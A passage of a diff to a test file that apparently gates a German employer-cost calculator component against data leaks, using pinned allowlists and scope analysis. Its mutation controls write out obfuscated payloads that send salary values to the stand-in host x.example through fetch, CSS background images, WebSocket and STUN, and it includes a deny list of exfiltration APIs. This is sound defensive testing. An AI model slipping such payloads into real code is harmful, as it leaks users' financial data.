@@ -198,12 +198,25 @@ const codeOnly = (src: string, file = 'source.ts') =>
  *                      the list. This is also where a new JSX tag lands, so
  *                      growing an <img>, <iframe> or <script> fails here.
  *
- *   FOREIGN PROPERTIES every property the closure reads or writes that it does
- *                      not itself declare. `ownerDocument`, `defaultView`,
- *                      `style`, `setProperty`, `setAttribute`, `innerHTML`,
- *                      `dataset` and `classList` are all foreign, and none is
- *                      on the list. Adding a field to the calculator's own
- *                      types is free; reaching for a platform API is not.
+ *   PROPERTIES        every property name the closure reads or writes — through
+ *                      `.x`, through `x['x']`, through a destructuring pattern,
+ *                      and through a JSX attribute. `ownerDocument`,
+ *                      `defaultView`, `style`, `setProperty`, `setAttribute`,
+ *                      `innerHTML`, `dataset`, `classList`, `fetch` and
+ *                      `constructor` are none of them on the list.
+ *
+ *                      THIS PIN WAS THE SET, NOT THE SUBSET, ONLY AFTER IT WAS
+ *                      DEFEATED. It used to be `used minus declared`, where
+ *                      `declared` was a single closure-wide bag fed by every
+ *                      object-literal key in nineteen files. `style: 'currency'`
+ *                      — an option handed to Intl.NumberFormat in formatting.ts
+ *                      — therefore DECLARED `style`, and `e.target['style'] =
+ *                      'background:url(//x/' + net + ')'` passed every
+ *                      assertion in this file while issuing a real cross-origin
+ *                      request, because CSSOM forwards that assignment to
+ *                      cssText. `title:` keys in the source registry did the
+ *                      same for `document['title']`. A pin that a data file can
+ *                      widen is not a pin.
  *
  *   COMPUTED ACCESS    every `x[expr]` whose subscript is not a literal, pinned
  *                      by file and object expression. Every split-string bypass
@@ -216,20 +229,39 @@ const codeOnly = (src: string, file = 'source.ts') =>
  *
  *   CONSTRUCTORS       every `new X`, so a new channel object cannot appear.
  *
- * WHAT THIS DOES AND DOES NOT BUY, stated plainly because the last four
- * versions of this comment over-claimed and were caught doing it:
+ * DESTRUCTURING IS A READ, NOT A DECLARATION. `const { fetch: send } = self`
+ * used to add `fetch` to the DECLARED side and nothing to the used side, so a
+ * capability could be lifted out of an object without any name this file checks
+ * ever appearing. It now lands in PROPERTIES like any other property read.
+ *
+ * A JSX ATTRIBUTE IS A PROPERTY WRITE. `style={{ backgroundImage: … }}` and
+ * `data-net={net}` used to be visible only to the textual rules further down.
+ * They are structural findings now.
+ *
+ * WHAT THIS DOES AND DOES NOT BUY, stated plainly because five versions of this
+ * comment over-claimed and were caught doing it:
  *
  *   • It is not a proof that no sink exists. It is a proof that the closure's
- *     entire vocabulary is a fixed, reviewed list, so reaching ANY sink —
- *     listed or not, named directly or assembled — changes one of these sets
- *     and fails. That is a different and stronger claim than "no forbidden
- *     substring appears", and it is the one the earlier comments pretended to.
+ *     entire vocabulary — globals, property names, computed sites, constructors
+ *     — is a fixed, reviewed list. A capability has to be NAMED to be reached,
+ *     and every way of naming one lands in a pinned set.
+ *   • The one thing that does not have to be named is a value handed to the
+ *     closure from outside: a callback argument, a prop, an event object. Those
+ *     are reachable without a free identifier, which is why property names are
+ *     pinned as well — `e.target` is available, and `e.target.ownerDocument` is
+ *     not.
+ *   • `href` IS pinned, because the boundary renders one cross-link and JSX
+ *     attribute names count as properties. What constrains its VALUE is the
+ *     href rule below, which requires every href expression to be constant.
  *   • It does not resist an author who edits this file, and nothing can. The
  *     threat it is built against is a leak introduced into the calculator, not
  *     an adversary with commit rights over its own gate.
- *   • Scope resolution here is per-file and flat: a name declared anywhere in a
- *     file counts as declared everywhere in it. That over-approximates
- *     shadowing, and it is stated rather than assumed.
+ *   • Scope resolution is now real: declarations are bound to the scope that
+ *     owns them and references resolve up the chain. The previous flat per-file
+ *     model was defeated by adding an unused `.map((k, document) => …)`
+ *     parameter in one place to make `document` "local" three hundred lines
+ *     away. Real scoping fixes the trick as well as detecting it — a name that
+ *     genuinely shadows the global no longer holds the global.
  *   • The pinned sets are meant to be inconvenient. A legitimate change that
  *     touches a new property or a new global SHOULD stop here and be read.
  *
@@ -240,68 +272,105 @@ const codeOnly = (src: string, file = 'source.ts') =>
  */
 type Structure = {
   free: string[];
-  foreign: string[];
+  properties: string[];
   computed: string[];
   spreads: string[];
   ctors: string[];
 };
 
+/**
+ * Which AST nodes open a lexical scope.
+ *
+ * The previous version had no scope model at all: it collected every binding in
+ * a file into one flat set and treated a name as "declared" everywhere in that
+ * file if it was bound anywhere in it. A reviewer added a SECOND, UNUSED
+ * parameter to an unrelated `.map()` callback —
+ *
+ *     {STEUERKLASSEN.map((k, document) => (
+ *
+ * — and `document` was thereafter local for the whole file, so a
+ * `document['title'] = gross + steuerklasse + churchFlag` in a different handler
+ * three hundred lines away never entered the free set. The same trick with
+ * `self` produced a plain cross-origin fetch. Both passed 1 204 assertions.
+ *
+ * Real scoping also fixes the trick rather than merely detecting it: a name that
+ * genuinely shadows the global no longer HOLDS the global, so the leak stops
+ * working at the same moment it stops being invisible.
+ */
+const opensScope = (n: ts.Node): boolean =>
+  ts.isSourceFile(n) || ts.isBlock(n) || ts.isModuleBlock(n) || ts.isFunctionDeclaration(n) ||
+  ts.isFunctionExpression(n) || ts.isArrowFunction(n) || ts.isMethodDeclaration(n) ||
+  ts.isConstructorDeclaration(n) || ts.isGetAccessor(n) || ts.isSetAccessor(n) ||
+  ts.isForStatement(n) || ts.isForOfStatement(n) || ts.isForInStatement(n) ||
+  ts.isCatchClause(n) || ts.isCaseBlock(n) || ts.isClassDeclaration(n) ||
+  ts.isClassExpression(n) || ts.isInterfaceDeclaration(n) || ts.isTypeAliasDeclaration(n) ||
+  ts.isEnumDeclaration(n) || ts.isConditionalTypeNode(n) || ts.isMappedTypeNode(n);
+
 function structure(sources: ReadonlyMap<string, string>): Structure {
   const free = new Set<string>();
-  const used = new Set<string>();
-  const declared = new Set<string>();
+  const properties = new Set<string>();
   const computed = new Set<string>();
   const spreads: string[] = [];
   const ctors = new Set<string>();
-  const nameOf = (n: ts.Node): string | null =>
-    !n ? null : ts.isIdentifier(n) ? n.text : ts.isStringLiteral(n) ? n.text : null;
+  const text = (n: ts.Node | undefined): string | null =>
+    !n ? null : ts.isIdentifier(n) || ts.isPrivateIdentifier(n) ? n.text
+      : ts.isStringLiteral(n) ? n.text : null;
 
-  for (const [rel, text] of sources) {
-    const sf = parse(rel, text);
+  for (const [rel, source] of sources) {
+    const sf = parse(rel, source);
 
-    // Everything this file binds: imports, variables, parameters, destructured
-    // names, functions, classes and types. What is left over is free.
-    const local = new Set<string>();
-    const collect = (n: ts.Node) => {
-      if ((ts.isImportSpecifier(n) || ts.isImportClause(n) || ts.isNamespaceImport(n)) && n.name) {
-        local.add(n.name.text);
-      }
-      if (ts.isVariableDeclaration(n) || ts.isParameter(n) || ts.isBindingElement(n)) {
-        const bind = (b: ts.Node) => {
-          if (ts.isIdentifier(b)) local.add(b.text);
-          else if (ts.isObjectBindingPattern(b) || ts.isArrayBindingPattern(b)) {
-            for (const el of b.elements) if (!ts.isOmittedExpression(el) && el.name) bind(el.name);
-          }
-        };
-        if (n.name) bind(n.name);
-      }
-      if ((ts.isFunctionDeclaration(n) || ts.isClassDeclaration(n)) && n.name) local.add(n.name.text);
-      if (ts.isTypeAliasDeclaration(n) || ts.isInterfaceDeclaration(n) || ts.isEnumDeclaration(n)) {
-        local.add(n.name.text);
-      }
-      ts.forEachChild(n, collect);
+    // ── Pass one: bind every declaration to the scope that owns it.
+    const scopes = new Map<ts.Node, Set<string>>();
+    const enclosing = (n: ts.Node): ts.Node => {
+      for (let p: ts.Node = n; p; p = p.parent) if (opensScope(p)) return p;
+      return sf;
     };
-    collect(sf);
+    const add = (scope: ts.Node, name: string) => {
+      if (!scopes.has(scope)) scopes.set(scope, new Set());
+      scopes.get(scope).add(name);
+    };
+    const bind = (pattern: ts.Node, scope: ts.Node) => {
+      if (!pattern) return;
+      if (ts.isIdentifier(pattern)) add(scope, pattern.text);
+      else if (ts.isObjectBindingPattern(pattern) || ts.isArrayBindingPattern(pattern)) {
+        for (const el of pattern.elements) if (!ts.isOmittedExpression(el)) bind(el.name, scope);
+      }
+    };
+    const declare = (n: ts.Node) => {
+      if (ts.isVariableDeclaration(n) || ts.isParameter(n)) bind(n.name, enclosing(n));
+      else if (ts.isTypeParameterDeclaration(n)) add(enclosing(n), n.name.text);
+      else if ((ts.isFunctionDeclaration(n) || ts.isClassDeclaration(n)) && n.name) add(enclosing(n.parent), n.name.text);
+      else if (ts.isFunctionExpression(n) && n.name) add(n, n.name.text);
+      else if (ts.isTypeAliasDeclaration(n) || ts.isInterfaceDeclaration(n) || ts.isEnumDeclaration(n)) add(enclosing(n.parent), n.name.text);
+      else if ((ts.isImportSpecifier(n) || ts.isImportClause(n) || ts.isNamespaceImport(n)) && n.name) add(sf, n.name.text);
+      else if (ts.isCatchClause(n) && n.variableDeclaration) bind(n.variableDeclaration.name, n);
+      ts.forEachChild(n, declare);
+    };
+    declare(sf);
+    const resolves = (node: ts.Node, name: string): boolean => {
+      for (let p: ts.Node = node; p; p = p.parent) if (opensScope(p) && scopes.get(p)?.has(name)) return true;
+      return false;
+    };
 
+    // ── Pass two: collect what the file reaches.
     const walk = (n: ts.Node) => {
-      if (ts.isPropertyAccessExpression(n)) used.add(n.name.text);
+      if (ts.isPropertyAccessExpression(n)) properties.add(n.name.text);
       if (ts.isElementAccessExpression(n)) {
         const arg = n.argumentExpression;
-        if (ts.isStringLiteral(arg)) used.add(arg.text);
+        if (ts.isStringLiteral(arg) || ts.isNoSubstitutionTemplateLiteral(arg)) properties.add(arg.text);
         else if (!ts.isNumericLiteral(arg)) computed.add(`${rel} :: ${n.expression.getText(sf)}`);
       }
-      if (
-        ts.isPropertySignature(n) || ts.isMethodSignature(n) || ts.isPropertyAssignment(n) ||
-        ts.isShorthandPropertyAssignment(n) || ts.isPropertyDeclaration(n) ||
-        ts.isMethodDeclaration(n) || ts.isGetAccessor(n) || ts.isEnumMember(n)
-      ) {
-        const name = nameOf(n.name);
-        if (name) declared.add(name);
+      // DESTRUCTURING IS A PROPERTY READ. The previous version counted it as a
+      // DECLARATION, which is how `const { fetch: send } = self` extracted a
+      // capability without any name ever entering the checked sets.
+      if (ts.isBindingElement(n) && ts.isObjectBindingPattern(n.parent)) {
+        const name = text(n.propertyName ?? n.name);
+        if (name) properties.add(name);
       }
-      if (ts.isBindingElement(n)) {
-        const name = nameOf(n.propertyName ?? n.name);
-        if (name) declared.add(name);
-      }
+      // A JSX ATTRIBUTE IS A PROPERTY WRITE ON A NODE. Counting it keeps
+      // `style={{ backgroundImage: … }}` and `data-net={net}` inside the
+      // structural gate instead of leaving them to the textual rules.
+      if (ts.isJsxAttribute(n)) properties.add(n.name.getText(sf));
       if (ts.isNewExpression(n)) ctors.add(n.expression.getText(sf));
       if (ts.isJsxSpreadAttribute(n)) spreads.push(rel);
       if (ts.isIdentifier(n)) {
@@ -310,14 +379,16 @@ function structure(sources: ReadonlyMap<string, string>): Structure {
           (ts.isPropertyAccessExpression(p) && p.name === n) ||
           (ts.isPropertyAssignment(p) && p.name === n) ||
           (ts.isPropertySignature(p) && p.name === n) ||
+          (ts.isPropertyDeclaration(p) && p.name === n) ||
           (ts.isMethodSignature(p) && p.name === n) ||
+          (ts.isMethodDeclaration(p) && p.name === n) ||
           (ts.isEnumMember(p) && p.name === n) ||
           (ts.isJsxAttribute(p) && p.name === n) ||
           (ts.isBindingElement(p) && p.propertyName === n) ||
           (ts.isQualifiedName(p) && p.right === n) ||
           ts.isImportSpecifier(p) ||
           ts.isExportSpecifier(p);
-        if (!isName && !local.has(n.text)) free.add(n.text);
+        if (!isName && !resolves(n, n.text)) free.add(n.text);
       }
       ts.forEachChild(n, walk);
     };
@@ -326,7 +397,7 @@ function structure(sources: ReadonlyMap<string, string>): Structure {
 
   return {
     free: [...free].sort(),
-    foreign: [...used].filter((p) => !declared.has(p)).sort(),
+    properties: [...properties].sort(),
     computed: [...computed].sort(),
     spreads,
     ctors: [...ctors].sort(),
@@ -368,7 +439,13 @@ function renderedClasses(): Set<string> {
  * 480px) {` as a selector and so never inspected the first rule inside any
  * media block — and the calculator's narrow-viewport reflow lives in one.
  */
-function cssRules(css: string): Array<{ selector: string; body: string }> {
+function cssRules(source: string): Array<{ selector: string; body: string }> {
+  // Comments first, and with their newlines kept so a reported selector still
+  // points at the right line. A comment sitting above a rule was being read as
+  // part of that rule's selector, so prose that happened to contain `[` looked
+  // like an attribute selector — a false positive today, and a place to hide a
+  // real one tomorrow.
+  const css = source.replace(/\/\*[\s\S]*?\*\//g, (m) => m.replace(/[^\n]/g, ' '));
   const out: Array<{ selector: string; body: string }> = [];
   const walk = (text: string) => {
     let depth = 0;
@@ -463,7 +540,6 @@ const FREE = new Set([
   'Map',
   'Math',
   'Number',
-  'ONE',
   'Object',
   'Parameters',
   'RangeError',
@@ -472,89 +548,394 @@ const FREE = new Set([
   'Record',
   'Set',
   'String',
-  'T',
   'TypeError',
-  'ZERO',
-  'add',
-  'align',
-  'compareTo',
   'const',
   'dd',
   'details',
   'div',
-  'divideExact',
-  'divideScaled',
   'dl',
   'dt',
   'fieldset',
   'form',
   'h2',
   'h3',
-  'isZero',
+  'input',
   'label',
   'legend',
   'li',
-  'longValue',
-  'multiply',
-  'negate',
-  'of',
+  'noscript',
   'option',
   'p',
   'section',
   'select',
-  'setScale',
   'span',
   'strong',
-  'subtract',
   'summary',
   'table',
   'tbody',
   'td',
   'th',
   'thead',
-  'toNumber',
-  'toString',
   'ul',
   'undefined',
 ]);
 
-const FOREIGN = new Set([
+const PROPERTIES = new Set([
+  'AJAHR',
+  'ALTE',
+  'ALTER1',
+  'ALV',
+  'ANP',
+  'ANTEIL1',
+  'AVSATZAN',
+  'BBGKVPV',
+  'BBGRVALV',
+  'BK',
+  'BKS',
+  'BMG',
+  'DIFF',
+  'EFA',
+  'FVB',
+  'FVBSO',
+  'FVBZ',
+  'FVBZSO',
+  'GFB',
+  'HBALTE',
+  'HFVB',
+  'HFVBZ',
+  'HFVBZSO',
+  'HOCH',
+  'J',
+  'JBMG',
+  'JFREIB',
+  'JHINZU',
+  'JLFREIB',
+  'JLHINZU',
+  'JRE4',
+  'JRE4ENT',
+  'JVBEZ',
+  'JW',
+  'K',
+  'KFB',
+  'KRV',
+  'KVSATZAN',
+  'KVZ',
+  'KZTAB',
+  'LSTJAHR',
+  'LSTLZZ',
+  'LSTOSO',
+  'LSTSO',
+  'LZZ',
+  'LZZFREIB',
+  'LZZHINZU',
   'MAX_SAFE_INTEGER',
+  'MBV',
+  'MIST',
   'NumberFormat',
+  'PKPV',
+  'PKPVAGZ',
+  'PKPVAGZJ',
+  'PKV',
+  'PVA',
+  'PVS',
+  'PVSATZAN',
+  'PVZ',
+  'R',
+  'RE4',
+  'RVSATZAN',
+  'RW',
+  'SAP',
+  'SOLZFREI',
+  'SOLZJ',
+  'SOLZLZZ',
+  'SOLZMIN',
+  'SOLZS',
+  'SOLZSBMG',
+  'SOLZSZVE',
+  'SONSTB',
+  'SONSTENT',
+  'ST',
+  'ST1',
+  'ST2',
+  'STERBE',
+  'STKL',
+  'STS',
+  'VBEZ',
+  'VBEZB',
+  'VBEZBSO',
+  'VBEZM',
+  'VBEZS',
+  'VBS',
+  'VERGL',
+  'VFRB',
+  'VFRBS1',
+  'VFRBS2',
+  'VJAHR',
+  'VSP',
+  'VSPALV',
+  'VSPHB',
+  'VSPKVPV',
+  'VSPN',
+  'VSPR',
+  'W1STKL5',
+  'W2STKL5',
+  'W3STKL5',
+  'WVFRB',
+  'WVFRBM',
+  'WVFRBO',
+  'X',
+  'Y',
+  'ZERO',
+  'ZKF',
+  'ZMVB',
+  'ZRE4',
+  'ZRE4J',
+  'ZRE4VP',
+  'ZRE4VPR',
+  'ZTABFB',
+  'ZVBEZ',
+  'ZVBEZJ',
+  'ZVE',
+  'ZX',
+  'ZZX',
+  'aag',
+  'accident',
+  'accidentCent',
+  'accidentHint',
+  'accidentMonthlyCent',
+  'add',
+  'advanced',
+  'advancedHint',
+  'af',
+  'align',
+  'amountCent',
+  'aria-describedby',
+  'aria-invalid',
+  'aria-label',
+  'aria-labelledby',
+  'aria-live',
+  'atLeast23',
+  'autoComplete',
+  'avBeitragssatz',
+  'averageSupplementPercent',
+  'baseCent',
+  'basePercent',
+  'basisCare',
+  'basisHealth',
+  'basisLevies',
+  'basisPension',
+  'basisTax',
+  'basisUnemployment',
+  'breakdown',
+  'bvv',
   'call',
+  'cappedAt',
+  'care',
+  'case',
+  'ceilingHealth',
+  'ceilingPension',
   'checked',
+  'childlessSurchargePercent',
+  'children',
+  'childrenHint',
+  'childrenUnder25',
+  'churchTax',
+  'churchTaxCent',
+  'churchTaxLiable',
+  'className',
+  'compareTo',
+  'contributions',
+  'control',
+  'data-label',
+  'data-severity',
+  'declared',
+  'deductions',
+  'divideExact',
+  'divideScaled',
+  'employee',
+  'employeeCent',
+  'employeePercent',
+  'employeeRatePercent',
+  'employeeShare',
+  'employeeSocial',
+  'employer',
+  'employerCent',
+  'employerCosts',
+  'employerPercent',
+  'employerRatePercent',
+  'employerShare',
+  'employerTotal',
+  'employerTotalAnnual',
+  'employment',
+  'empty',
+  'errors',
   'every',
+  'f',
+  'field',
   'filter',
   'find',
   'format',
+  'generalPercent',
+  'generic',
   'get',
+  'gkvRechengroessen',
+  'gkvStabG',
+  'gross',
+  'grossCent',
+  'grossHint',
   'has',
   'hasOwnProperty',
+  'heading',
+  'health',
+  'healthCeilingMonthly',
+  'healthSupplementPercent',
+  'href',
+  'htmlFor',
+  'id',
   'includes',
+  'inputMode',
+  'insolvency',
+  'insolvencyHint',
+  'insolvencyLevy',
+  'insolvenzgeld',
+  'insurance',
+  'insuranceAdvanced',
+  'insuranceThreshold',
+  'insuranceThresholdAnnual',
   'isFinite',
   'isInteger',
+  'isParent',
+  'isParentHint',
+  'issues',
   'join',
+  'kappungUnmodelled',
+  'key',
   'keys',
+  'kind',
+  'kinderfreibetraege',
+  'kinderfreibetraegeHint',
+  'kirchensteuer',
+  'kvBeitragssatz',
+  'kvTragung',
+  'kvZusatzbeitrag',
+  'label',
+  'labelCs',
+  'labelDe',
+  'labelEn',
+  'lang',
   'lastIndexOf',
+  'ledgerNote',
+  'legalBasis',
   'length',
+  'levies',
+  'liable',
+  'loadFactor',
+  'locale',
   'localeCompare',
+  'lohnsteuer',
+  'lohnsteuerCent',
+  'longValue',
   'map',
   'max',
+  'maxDiscountedChildren',
   'min',
+  'minijob',
+  'minijobMonthly',
+  'minijobMonthlyCent',
+  'minijobThreshold',
+  'monthlyCeilingCent',
+  'monthlyGrossCent',
+  'multiply',
+  'net',
+  'netCent',
+  'notAdvice',
+  'notes',
+  'of',
+  'onChange',
+  'onSubmit',
+  'outputs',
+  'owesInsolvencyLevy',
   'padEnd',
   'padStart',
+  'pap',
+  'pension',
+  'pensionCeilingMonthly',
+  'perChildDiscountPercent',
+  'percent',
   'preventDefault',
+  'privacy',
   'prototype',
   'push',
+  'pvBeitragssatz',
+  'pvStatut',
+  'pvTragung',
+  'ratePercent',
+  'reason',
+  'reasonCs',
+  'reasonDe',
+  'reasonEn',
   'reduce',
+  'reducedHealthRate',
+  'reducedPercent',
+  'reducedRate',
   'replace',
+  'results',
+  'role',
+  'rvBeitragssatz',
+  'saxony',
+  'saxonyEmployeeExtraPoints',
+  'scale',
+  'scope',
+  'setScale',
+  'severity',
   'slice',
+  'socialCent',
+  'socialSource',
+  'soli',
+  'soliCent',
   'sort',
+  'sourceId',
   'split',
   'startsWith',
+  'step',
+  'steuerklasse',
+  'steuerklasseHint',
+  'subtract',
+  'supplement',
+  'supplementHint',
+  'supplementPercent',
+  'supported',
+  'svRechgr',
+  'tabIndex',
   'target',
+  'tax',
+  'taxSource',
   'test',
+  'text',
+  'toString',
+  'totalAnnualCent',
+  'totalDeductionsCent',
+  'totalMonthlyCent',
+  'totalPercent',
+  'transitionThreshold',
+  'transitionUpperMonthly',
+  'transitionUpperMonthlyCent',
   'trim',
+  'type',
+  'u1',
+  'u1Hint',
+  'u1Percent',
+  'u1Rate',
+  'u2',
+  'u2Hint',
+  'u2Percent',
+  'unemployment',
+  'unfall',
+  'unscaled',
+  'value',
+  'why',
+  'workplace',
+  'workplaceHint',
 ]);
 
 const COMPUTED = new Set([
@@ -563,9 +944,11 @@ const COMPUTED = new Set([
   'components/DeEmployerCostCalculator.tsx :: BUNDESLAND_NAMES[b]',
   'components/DeEmployerCostCalculator.tsx :: ERROR_FIELD',
   'components/DeEmployerCostCalculator.tsx :: ERROR_TEXT',
+  'components/DeEmployerCostCalculator.tsx :: ISSUE_CONTROL',
   'components/DeEmployerCostCalculator.tsx :: ISSUE_FIELD',
   'components/DeEmployerCostCalculator.tsx :: ISSUE_TEXT',
   'components/DeEmployerCostCalculator.tsx :: NOTE_TEXT',
+  'components/DeEmployerCostCalculator.tsx :: PARSE_ERROR_CONTROL',
   'components/DeEmployerCostCalculator.tsx :: [\'I\', \'II\', \'III\', \'IV\', \'V\', \'VI\']',
   'components/DeEmployerCostCalculator.tsx :: c.label',
   'components/DeEmployerCostCalculatorBoundary.tsx :: CROSS_LINK_PATH',
@@ -596,7 +979,7 @@ const CTORS = new Set(['Decimal', 'Error', 'Intl.NumberFormat', 'Map', 'RangeErr
 
 const violations = (s: Structure): string[] => [
   ...s.free.filter((x) => !FREE.has(x)).map((x) => `free identifier: ${x}`),
-  ...s.foreign.filter((x) => !FOREIGN.has(x)).map((x) => `foreign property: ${x}`),
+  ...s.properties.filter((x) => !PROPERTIES.has(x)).map((x) => `property: ${x}`),
   ...s.computed.filter((x) => !COMPUTED.has(x)).map((x) => `computed access: ${x}`),
   ...s.spreads.map((x) => `JSX spread attribute: ${x}`),
   ...s.ctors.filter((x) => !CTORS.has(x)).map((x) => `constructor: new ${x}`),
@@ -627,17 +1010,29 @@ describe('STRUCTURAL — the closure is confined to a reviewed vocabulary', () =
     }
   });
 
-  it('touches no property it does not itself declare', () => {
-    expect(STRUCTURE.foreign.filter((x) => !FOREIGN.has(x))).toEqual([]);
+  it('reads and writes no property outside the pinned vocabulary', () => {
+    expect(STRUCTURE.properties.filter((x) => !PROPERTIES.has(x))).toEqual([]);
+    // Named explicitly, and this list is no longer vacuous. The previous set was
+    // `used \ declared`, and `declared` was a closure-wide bag fed by every
+    // object-literal key in nineteen files — so `style: 'currency'`, an option
+    // passed to Intl.NumberFormat in formatting.ts, authorized `x['style']`, and
+    // `title:` keys in the source registry authorized `document['title']`. Both
+    // assertions below read `false` and proved nothing, because the names were
+    // filtered out before the allowlist was consulted. Pinning the properties
+    // the closure actually REACHES removes the filter and with it the hole.
     for (const forbidden of [
-      'ownerDocument', 'defaultView', 'style', 'setProperty', 'setAttribute', 'innerHTML',
-      'outerHTML', 'insertAdjacentHTML', 'classList', 'dataset', 'createElement', 'appendChild',
-      'contentWindow', 'srcdoc', 'href', 'src', 'action', 'title', 'name', 'current',
+      'ownerDocument', 'defaultView', 'style', 'cssText', 'setProperty', 'setAttribute',
+      'innerHTML', 'outerHTML', 'insertAdjacentHTML', 'classList', 'dataset', 'createElement',
+      'appendChild', 'contentWindow', 'srcdoc', 'src', 'action', 'title', 'name', 'current',
       'currentTarget', 'postMessage', 'sendBeacon', 'setItem', 'open', 'submit', 'assign',
-      'replaceState', 'pushState',
+      'replaceState', 'pushState', 'fetch', 'constructor', '__proto__', 'backgroundImage',
     ]) {
-      expect(FOREIGN.has(forbidden), `${forbidden} is on the allowed list`).toBe(false);
+      expect(PROPERTIES.has(forbidden), `${forbidden} is on the allowed list`).toBe(false);
     }
+    // href IS pinned — the boundary renders one cross-link and JSX attribute
+    // names are properties now. What constrains its VALUE is the href rule
+    // below, which requires every href expression to be a constant.
+    expect(PROPERTIES.has('href')).toBe(true);
   });
 
   it('performs no computed member access outside the pinned lookup tables', () => {
@@ -661,69 +1056,173 @@ describe('STRUCTURAL — the closure is confined to a reviewed vocabulary', () =
    * these cannot rot into assertions about a line that no longer exists.
    */
   const HANDLER = "onChange={(e) => set('gross')(e.target.value)}";
-  const mutate = (replacement: string): Structure => {
+  /**
+   * Replace the gross handler, and optionally one more anchor.
+   *
+   * The second edit exists because two of this round's bypasses needed a
+   * SHADOWING BINDING somewhere else in the file to disarm the free-identifier
+   * pin — an unused `.map((k, document) => …)` parameter three hundred lines
+   * from the leak. A control that could not make that edit could not replay
+   * them.
+   */
+  const mutate = (replacement: string, extra?: [string, string]): Structure => {
     const sources = new Map(sourceMap());
     const src = sources.get(COMPONENT);
     expect(src.includes(HANDLER), 'the mutation anchor has moved').toBe(true);
-    sources.set(COMPONENT, src.replace(HANDLER, replacement));
+    let next = src.replace(HANDLER, replacement);
+    if (extra) {
+      expect(src.includes(extra[0]), `the secondary anchor has moved: ${extra[0]}`).toBe(true);
+      next = next.replace(extra[0], extra[1]);
+    }
+    sources.set(COMPONENT, next);
     return structure(sources);
   };
+  const SHADOW = (name: string): [string, string] => [
+    '{STEUERKLASSEN.map((k) => (',
+    `{STEUERKLASSEN.map((k, ${name}) => (`,
+  ];
 
-  const LEAKS: Array<[string, string]> = [
+  /**
+   * label, the mutation, and THE PIN THAT MUST FIRE.
+   *
+   * The third element is what stops a control from passing for an accidental
+   * reason. Several of these leaks also trip the textual rules further down; a
+   * control that only proved "something failed" would not distinguish the
+   * structural proof from its defence in depth, which is exactly the confusion
+   * the last three rounds of comments were caught making.
+   */
+  const LEAKS: Array<[string, string, string]> = [
     [
       'an unobfuscated fetch, the leak the broken comment stripper hid',
       "onChange={(e) => { fetch('https://x.example/leak?g=' + e.target.value); set('gross')(e.target.value) }}",
+      'free identifier: fetch',
     ],
     [
       'the split-literal background-image write, via e.target',
       "onChange={(e) => { const n = e.target; n['sty' + 'le']['setPro' + 'perty']('back' + 'ground-' + 'image', 'ur' + 'l(ht' + 'tps:' + '/' + '/x.example/' + n.value + ')'); set('gross')(n.value) }}",
+      'computed access',
     ],
     [
       'the same write with a same-origin payload, which no wire watcher catches',
       "onChange={(e) => { const n = e.target; n.style.backgroundImage = 'ur' + 'l(/r/' + n.value + ')'; set('gross')(n.value) }}",
+      'property: style',
     ],
     [
       'ambient state through ownerDocument, which issues no request at all',
       "onChange={(e) => { const n = e.target; n.ownerDocument.title = n.value + ':' + steuerklasse; set('gross')(n.value) }}",
+      'property: ownerDocument',
     ],
     [
       'localStorage reached through defaultView',
       "onChange={(e) => { e.target.ownerDocument.defaultView['local' + 'Storage']['setItem']('g', e.target.value); set('gross')(e.target.value) }}",
+      'property: defaultView',
     ],
     [
       'the realm walk that defeated the whole transmission blacklist',
       "onChange={(e) => { Function('return this')()['fe' + 'tch']('ht' + 'tps:' + '/' + '/x.example/' + e.target.value); set('gross')(e.target.value) }}",
+      'free identifier: Function',
     ],
     [
       'a WebSocket built from fragments',
       "onChange={(e) => { const g = e.target.ownerDocument.defaultView; new g['Web' + 'Socket']('ws' + 's:' + '/' + '/x.example/' + e.target.value); set('gross')(e.target.value) }}",
+      'constructor: new g',
     ],
     [
       'the STUN leak, which the Playwright wire watcher cannot see',
       "onChange={(e) => { const g = e.target.ownerDocument.defaultView; new g.RTCPeerConnection({ iceServers: [{ urls: 'stu' + 'n:' + e.target.value + '.x.example' }] }); set('gross')(e.target.value) }}",
+      'property: RTCPeerConnection',
     ],
     [
       'an image element assembled at run time',
       "onChange={(e) => { const d = e.target.ownerDocument; const i = d['create' + 'Element']('img'); i['sr' + 'c'] = '/p?g=' + e.target.value; d.body['append' + 'Child'](i); set('gross')(e.target.value) }}",
+      'property: ownerDocument',
     ],
     [
       'the JSX spread half of the CSS conspiracy',
       "onChange={(e) => set('gross')(e.target.value)} {...{ ['data-' + 'net']: String(outcome && outcome.supported ? outcome.employee.netCent : '') }}",
+      'JSX spread attribute',
     ],
     [
       'window.name, reached without naming window',
       "onChange={(e) => { e.target.ownerDocument.defaultView.name = 'net=' + e.target.value; set('gross')(e.target.value) }}",
+      'property: name',
     ],
     [
       'a value encoded before it reaches a sink, so no rendered figure matches',
       "onChange={(e) => { e.target.ownerDocument.title = Number(e.target.value).toString(36); set('gross')(e.target.value) }}",
+      'property: title',
+    ],
+    // ── Round six. Each of these passed all 749 assertions on the previous
+    // candidate, and each attacked the MODEL rather than the spelling.
+    [
+      'a bracketed style assignment, which CSSOM forwards to cssText',
+      "onChange={(e) => { e.target['style'] = 'back' + 'ground:u' + 'rl(' + '/' + '/x.example/' + e.target.value + ')'; set('gross')(e.target.value) }}",
+      'property: style',
+    ],
+    [
+      'the same write with a same-origin payload no wire watcher matches',
+      "onChange={(e) => { e.target['style'] = 'back' + 'ground:u' + 'rl(/r/' + Number(e.target.value).toString(36) + ')'; set('gross')(e.target.value) }}",
+      'property: style',
+    ],
+    [
+      'a capability lifted out by destructuring, so no dangerous name is ever written',
+      "onChange={(e) => { const { style: css } = e.target; css.backgroundImage = 'ur' + 'l(/r/' + e.target.value + ')'; set('gross')(e.target.value) }}",
+      'property: style',
+    ],
+    [
+      'style as a JSX prop, previously visible only to the textual rules',
+      "onChange={(e) => set('gross')(e.target.value)} style={{ backgroundImage: 'ur' + 'l(/r/' + gross + ')' }}",
+      'property: style',
+    ],
+    [
+      'a data attribute carrying a figure, the CSS half of the conspiracy',
+      "onChange={(e) => set('gross')(e.target.value)} data-net={String(outcome && outcome.supported ? outcome.employee.netCent : '')}",
+      'property: data-net',
     ],
   ];
 
-  for (const [label, leak] of LEAKS) {
+  /**
+   * The two that need a shadowing binding elsewhere in the file.
+   *
+   * Both were plain, unobfuscated leaks: a `fetch` and a `document.title` write
+   * with no string splitting at all. What hid them was the analyser's own flat
+   * per-file scope, and a single unused parameter was the whole trick.
+   */
+  const SHADOWED_LEAKS: Array<[string, string, string, string]> = [
+    [
+      'a plain fetch, hidden by shadowing `self` in an unrelated callback',
+      'self',
